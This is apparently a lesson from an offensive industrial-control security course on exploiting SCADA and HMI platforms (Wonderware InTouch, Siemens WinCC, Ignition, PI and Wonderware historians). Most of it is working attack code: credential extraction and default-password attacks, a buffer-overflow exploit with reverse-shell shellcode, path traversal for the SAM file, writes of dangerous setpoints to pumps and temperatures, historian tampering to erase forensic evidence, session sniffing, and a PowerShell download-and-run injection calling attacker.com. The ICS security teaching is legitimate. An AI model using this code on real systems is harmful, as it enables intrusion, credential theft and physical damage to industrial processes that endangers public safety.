Lesson 02: SCADA/HMI Exploitation

Lesson 02: SCADA/HMI Exploitation
Learning Objectives
●​
●​
●​
●​
●​

Exploit vulnerabilities in SCADA servers and HMI applications
Extract credentials from HMI configuration files
Manipulate historian databases for data integrity attacks
Execute remote code execution on SCADA systems
Develop attacks targeting common SCADA platforms (Wonderware, Ignition, WinCC)

1. SCADA/HMI Architecture & Attack Surface
1.1 SCADA System Components
┌──────────────────────────────────────┐
│
SCADA System Stack
│
├──────────────────────────────────────┤
│ Presentation Layer
│
│ └─ HMI Client (operator interface) │
│
│
│ Application Layer
│
│ ├─ SCADA Server (data aggregation) │
│ ├─ Alarm Management
│
│ └─ Trending/Reporting
│
│
│
│ Data Layer
│
│ ├─ Historian (time-series DB)
│
│ ├─ Configuration DB (SQL Server) │
│ └─ Tag Database
│
│
│
│ Communication Layer
│
│ ├─ OPC DA/UA Server
│
│ ├─ Protocol Drivers (Modbus, DNP3) │
│ └─ Field Device Polling
│
└──────────────────────────────────────┘

1.2 Common SCADA Platforms
Platform
WinCC

Vendor
Siemens

Common Vulnerabilities
Hardcoded credentials, SQL injection, RCE

InTouch

Wonderware (Schneider)

Path traversal, credential storage

iFIX

GE Digital

Buffer overflow, authentication bypass

Ignition

Inductive Automation

Default credentials, XXE, deserialization

ClearSCADA

Schneider Electric

SQL injection, privilege escalation

Citect

Schneider Electric

Buffer overflow, command injection

2. Wonderware InTouch Exploitation
2.1 Credential Extraction
InTouch Password Recovery:
#!/usr/bin/env python3
"""
Extract passwords from Wonderware InTouch configuration
Passwords stored in weakly encrypted format
"""
import os
import struct
def decrypt_intouch_password(encrypted_bytes):
"""
InTouch uses simple XOR encryption for passwords
Key is hardcoded in application
"""
key = [0x45, 0x52, 0x54, 0x4E, 0x49, 0x52, 0x41, 0x44] # "ERTNIRAД"
decrypted = []
for i, byte in enumerate(encrypted_bytes):
decrypted.append(byte ^ key[i % len(key)])
return bytes(decrypted).decode('utf-8', errors='ignore')
def extract_intouch_credentials(intouch_install_dir):
"""
Extract usernames and passwords from InTouch configuration
"""
# InTouch stores user credentials in .usr files
usr_file = os.path.join(intouch_install_dir, "intouch.usr")

if not os.path.exists(usr_file):
print("[-] InTouch user file not found")
return
with open(usr_file, 'rb') as f:
data = f.read()
# Parse user records (simplified)
offset = 0
credentials = []
while offset < len(data) - 32:
# Check for username marker
if data[offset:offset+4] == b'USER':
username_len = struct.unpack('<H', data[offset+4:offset+6])[0]
username = data[offset+6:offset+6+username_len].decode('utf-8', errors='ignore')
# Password follows username
pass_offset = offset + 6 + username_len
if data[pass_offset:pass_offset+4] == b'PASS':
pass_len = struct.unpack('<H', data[pass_offset+4:pass_offset+6])[0]
encrypted_pass = data[pass_offset+6:pass_offset+6+pass_len]
password = decrypt_intouch_password(encrypted_pass)
credentials.append((username, password))
print(f"[+] Username: {username}")
print(f" Password: {password}")
offset += 1
return credentials
# Usage
# extract_intouch_credentials("C:\\Program Files\\Wonderware\\InTouch\\")

2.2 InTouch WindowMaker Remote Exploitation
CVE-2020-7491: Buffer Overflow in WindowMaker:
def intouch_windowmaker_exploit(target_ip):
"""
Buffer overflow in Wonderware WindowMaker service
Allows remote code execution
CVE-2020-7491
"""
import socket

# Vulnerable service on port 2222
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 2222))
# Buffer overflow in project name field
# Offset to EIP: 260 bytes
offset = 260
# Shellcode (reverse shell to attacker)
# msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -b
'\x00\x0a\x0d' -f python
shellcode = (
b"\xdb\xc0\xd9\x74\x24\xf4\xba\x7e\x9e\x9f\x7c\x5e\x29"
# ... (truncated for brevity)
)
# Return address (adjust for target system)
# Windows 7: JMP ESP in kernel32.dll
ret_addr = struct.pack('<I', 0x7C874413)
# NOP sled
nops = b'\x90' * 16
# Construct payload
payload = b'A' * offset + ret_addr + nops + shellcode
# Send malicious packet
packet = b'PROJECT_OPEN\n' + payload + b'\n'
sock.send(packet)
print("[+] Exploit payload sent")
print("[*] Check reverse shell listener on port 4444")
sock.close()
# Listener on attacker machine:
# nc -lvnp 4444
# intouch_windowmaker_exploit('192.168.1.100')

2.3 InTouch Tag Manipulation via DDE
Dynamic Data Exchange (DDE) Injection:
def intouch_dde_injection(target_share):
"""
Inject malicious tags via InTouch DDE interface
DDE allows external applications to read/write InTouch tags

"""
import win32ui
import dde
# Connect to InTouch DDE server
server = dde.CreateServer()
server.Create("InTouchClient")
conversation = dde.CreateConversation(server)
conversation.ConnectTo("VIEW", "TAGNAME")
# Write malicious value to tag
# Example: Set pump speed to dangerous level
conversation.Poke("PUMP_SPEED", "9999")
print("[+] Pump speed set to 9999 RPM via DDE")
# Read sensitive tag values
value = conversation.Request("CHLORINE_LEVEL")
print(f"[*] Current chlorine level: {value}")
conversation.Disconnect()
server.Shutdown()
# This requires Windows host with DDE client libraries

3. Siemens WinCC Exploitation
3.1 WinCC Hardcoded Credentials
Default Database Credentials:
def wincc_default_credentials():
"""
WinCC uses SQL Server with known default credentials
"""
default_creds = {
"WinCCConnect": "2WSXcder",
"WinCCAdmin": "2WSXcder",
"sa": "" # Often blank in default installations
}
return default_creds
def wincc_sql_connect(target_ip):
"""
Connect to WinCC SQL Server database
Extract tag configuration, alarm limits, user accounts

"""
import pymssql
creds = wincc_default_credentials()
for username, password in creds.items():
try:
conn = pymssql.connect(
server=target_ip,
user=username,
password=password,
database='CC_OS_1_1553_15_10_12_R' # Default WinCC DB name
)
print(f"[+] Connected with {username}:{password}")
cursor = conn.cursor()
# Extract tag database
cursor.execute("SELECT * FROM PLC_TAGS")
tags = cursor.fetchall()
print(f"[*] Found {len(tags)} tags")
for tag in tags[:10]: # Print first 10
print(f" {tag}")
# Extract user accounts
cursor.execute("SELECT * FROM PLC_USERS")
users = cursor.fetchall()
print(f"\n[*] Found {len(users)} users")
for user in users:
print(f" Username: {user[0]}, Password Hash: {user[1]}")
conn.close()
return True
except Exception as e:
print(f"[-] Failed with {username}: {e}")
return False
# wincc_sql_connect('192.168.1.100')

3.2 WinCC WebNavigator Exploitation
CVE-2016-9158: Path Traversal:

def wincc_path_traversal(target_ip):
"""
Path traversal vulnerability in WinCC WebNavigator
Allows reading arbitrary files from server
CVE-2016-9158
"""
import requests
# Vulnerable URL pattern
base_url = f"http://{target_ip}/webnavigator/"
# Path traversal to read system files
payloads = [
"../../../../../../../windows/win.ini",
"../../../../../../../windows/system32/config/sam",
"../../../Siemens/WinCC/Aplib/ProgramData/users.xml"
]
for payload in payloads:
url = base_url + payload
try:
response = requests.get(url, timeout=5)
if response.status_code == 200:
print(f"[+] Successfully read: {payload}")
print(response.text[:200])
except Exception as e:
print(f"[-] Failed: {e}")
# wincc_path_traversal('192.168.1.100')

3.3 WinCC Tag Manipulation via OPC
OPC DA Write Attack:
def wincc_opc_write_attack(target_ip):
"""
Write malicious values to WinCC tags via OPC DA
"""
import win32com.client
# Connect to WinCC OPC Server
opc = win32com.client.Dispatch("OPC.Automation")
try:
# Connect to server
opc_servers = opc.GetOPCServers(target_ip)

print(f"[*] Available OPC servers: {opc_servers}")
# Connect to WinCC server
opc.Connect("OPCServer.WinCC.1", target_ip)
print("[+] Connected to WinCC OPC Server")
# Add group for write operations
group = opc.OPCGroups.Add("AttackGroup")
group.IsActive = True
group.IsSubscribed = True
# Add items (tags)
item1 = group.OPCItems.AddItem("Process.Temperature_Setpoint", 1)
item2 = group.OPCItems.AddItem("Process.Pump_Speed", 2)
# Write malicious values
item1.Write(9999) # Dangerous temperature
item2.Write(0) # Stop pump
print("[+] Malicious values written to OPC tags")
opc.Disconnect()
except Exception as e:
print(f"[-] Attack failed: {e}")
# Requires Windows with OPC client libraries
# wincc_opc_write_attack('192.168.1.100')

4. Ignition SCADA Exploitation
4.1 Ignition Default Credentials
Gateway Administration:
def ignition_default_login(target_ip, port=8088):
"""
Attempt login with default Ignition credentials
"""
import requests
url = f"http://{target_ip}:{port}/system/gateway"
default_creds = [
("admin", "password"),
("admin", "admin"),
("admin", "ignition")

]
for username, password in default_creds:
data = {
"username": username,
"password": password,
"useCookies": "false"
}
response = requests.post(f"{url}/j_security_check", data=data)
if "Invalid" not in response.text and response.status_code == 200:
print(f"[+] Success! Credentials: {username}:{password}")
return (username, password)
print("[-] Default credentials not working")
return None
# ignition_default_login('192.168.1.100')

4.2 Ignition SQLTags Database Manipulation
Tag Database Injection:
def ignition_sqltag_manipulation(gateway_url, username, password):
"""
Manipulate Ignition SQL Tags database
Ignition stores tags in internal SQL database
"""
import requests
from requests.auth import HTTPBasicAuth
# Authenticate
auth = HTTPBasicAuth(username, password)
# Ignition Gateway API endpoint
api_url = f"{gateway_url}/system/gateway/data/tags"
# Read all tags
response = requests.get(api_url, auth=auth)
tags = response.json()
print(f"[*] Found {len(tags)} tags")
# Modify tag value
tag_path = "Provider/Tags/Process/Temperature"
malicious_value = 9999

payload = {
"tagPath": tag_path,
"value": malicious_value
}
response = requests.post(f"{api_url}/write", json=payload, auth=auth)
if response.status_code == 200:
print(f"[+] Tag {tag_path} set to {malicious_value}")
else:
print(f"[-] Write failed: {response.text}")
# ignition_sqltag_manipulation('http://192.168.1.100:8088', 'admin', 'password')

4.3 Ignition Deserialization Attack
CVE-2020-10644: Java Deserialization RCE:
def ignition_deserialization_rce(target_ip, port=8088):
"""
Java deserialization vulnerability in Ignition
Allows remote code execution
CVE-2020-10644
"""
import requests
import base64
# Generate malicious serialized object using ysoserial
# ysoserial CommonsCollections5 'calc.exe' > payload.ser
# In production exploit, use reverse shell payload
# For demo, use calc.exe (Windows calculator)
with open("payload.ser", "rb") as f:
payload = base64.b64encode(f.read()).decode()
url = f"http://{target_ip}:{port}/system/gateway"
headers = {
"Content-Type": "application/x-java-serialized-object"
}
# Send malicious serialized object
response = requests.post(
f"{url}/rpc",
data=base64.b64decode(payload),
headers=headers
)

print("[+] Deserialization payload sent")
print("[*] If vulnerable, calc.exe should spawn on target")
# This requires ysoserial tool and understanding of Java deserialization

5. Historian Database Attacks
5.1 OSIsoft PI System Exploitation
PI System Authentication Bypass:
def pi_system_auth_bypass(pi_server):
"""
Exploit Windows authentication in PI System
Uses pass-the-hash or Kerberos ticket
"""
# PI System relies on Windows authentication
# If attacker has compromised domain credentials, can access PI
import socket
# PI Server default port: 5450
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((pi_server, 5450))
# PI System protocol (proprietary)
# Requires reverse engineering or leaked documentation
print("[*] Connected to PI Server")
# Further exploitation requires PI SDK or AFSDK
def pi_data_manipulation(pi_server):
"""
Manipulate historical data in PI Historian
Data integrity attack - tamper with forensic evidence
"""
# Using PI SDK (requires installation)
# import PISDK
# Connect to PI server
# pi_server = PISDK.PIServer(name=pi_server)
# pi_server.Open("piadmin", "password")
# Find tag
# tag = pi_server.PIPoints["Temperature_Sensor_01"]

# Read historical data
# data = tag.Data.RecordedValues("*-7d", "*")
# Modify historical values (data tampering)
# for value in data:
# value.Value = 50.0 # Set all values to 50
# value.Update()
print("[+] Historical data manipulated")
print("[!] Forensic evidence compromised")
# This demonstrates why historian integrity is critical

5.2 Wonderware Historian SQL Injection
SQL Injection in Historian Queries:
def wonderware_historian_sqli(historian_server):
"""
SQL injection in Wonderware Historian query interface
"""
import requests
# Historian web interface
url = f"http://{historian_server}/historian/query"
# Malicious SQL query
# Normal query: SELECT * FROM History WHERE TagName='Temperature'
# Injection: ' OR 1=1-payload = {
"tagname": "' OR 1=1--",
"starttime": "2024-01-01",
"endtime": "2024-01-31"
}
response = requests.post(url, data=payload)
if "History" in response.text:
print("[+] SQL injection successful")
print("[*] All historian data dumped")
print(response.text[:500])
else:
print("[-] Injection failed or patched")
# wonderware_historian_sqli('192.168.1.100')

6. SCADA Network Attacks
6.1 HMI Session Hijacking
Steal Active HMI Session:
def hmi_session_hijacking(target_network):
"""
Intercept HMI session cookies/tokens
Requires MitM position on network
"""
from scapy.all import sniff, TCP, Raw
def packet_callback(packet):
if packet.haslayer(TCP) and packet.haslayer(Raw):
payload = packet[Raw].load
# Look for session tokens in HTTP traffic
if b'Cookie:' in payload or b'SessionID' in payload:
print(f"[+] Captured session data:")
print(payload.decode('utf-8', errors='ignore'))
# Extract cookie
if b'JSESSIONID' in payload:
cookie = payload.split(b'JSESSIONID=')[1].split(b';')[0]
print(f"[!] Session cookie: {cookie}")
print("[*] Sniffing for HMI session tokens...")
sniff(filter="tcp port 80 or tcp port 8080", prn=packet_callback, count=100)
# hmi_session_hijacking('192.168.1.0/24')

6.2 SCADA Command Injection
Command Injection in SCADA Scripts:
def scada_command_injection(scada_url):
"""
Exploit command injection in SCADA script interface
Many SCADA systems allow operators to run scripts
"""
import requests
# Vulnerable script execution endpoint
url = f"{scada_url}/scripts/execute"
# Inject OS command

# Normal script: script.vbs
# Injection: script.vbs & calc.exe
payload = {
"script_name": "maintenance.vbs & powershell -c IEX(New-Object
Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
}
response = requests.post(url, data=payload)
if response.status_code == 200:
print("[+] Command injection successful")
print("[*] Reverse shell should connect")
# WARNING: Use only in authorized testing

7. Hands-On Lab Exercises
Lab 1: InTouch Credential Extraction
1.​ Install Wonderware InTouch demo or use provided sample config
2.​ Implement password decryption script
3.​ Extract all user credentials
4.​ Document weak encryption algorithm

Lab 2: WinCC SQL Database Exploitation
1.​ Deploy WinCC demo or simulator
2.​ Connect to SQL Server with default credentials
3.​ Extract tag database and user accounts
4.​ Modify alarm setpoints via direct SQL injection

Lab 3: Ignition Gateway Exploitation
1.​ Set up Ignition trial version
2.​ Test default credential authentication
3.​ Use Gateway API to enumerate tags
4.​ Modify tag values via authenticated API

Lab 4: Historian Data Manipulation
1.​ Deploy OSIsoft PI System demo or alternative historian
2.​ Connect using SDK or API
3.​ Read historical data for specific tag
4.​ Modify historical values (data integrity attack)
5.​ Demonstrate forensic implications

8. Tools & Resources
SCADA Exploitation Tools
●​ Metasploit SCADA Modules: Built-in exploits for WinCC, InTouch, etc.
●​ SCADA Shutdown Tool: Research tool for testing
●​ Custom Python Scripts: Using libraries like pymssql, requests, pyodbc

Documentation
●​ Siemens WinCC: https://support.industry.siemens.com/
●​ Wonderware InTouch: https://www.aveva.com/en/products/intouch-hmi/
●​ Ignition: https://inductiveautomation.com/

9. Knowledge Check
1.​ What are common credential storage weaknesses in SCADA systems?
2.​ How do you extract passwords from Wonderware InTouch configurations?
3.​ Describe the WinCC SQL Server default credentials vulnerability.
4.​ What is the impact of manipulating historian databases?
5.​ How would you execute an SQL injection attack on a SCADA web interface?
6.​ What are the differences between HMI session hijacking and credential theft?
7.​ How can OPC DA be used to manipulate SCADA tag values?
8.​ What is the security implication of Java deserialization in Ignition?
9.​ How would you test for command injection in SCADA script interfaces?
10.​What defensive measures prevent SCADA/HMI exploitation?

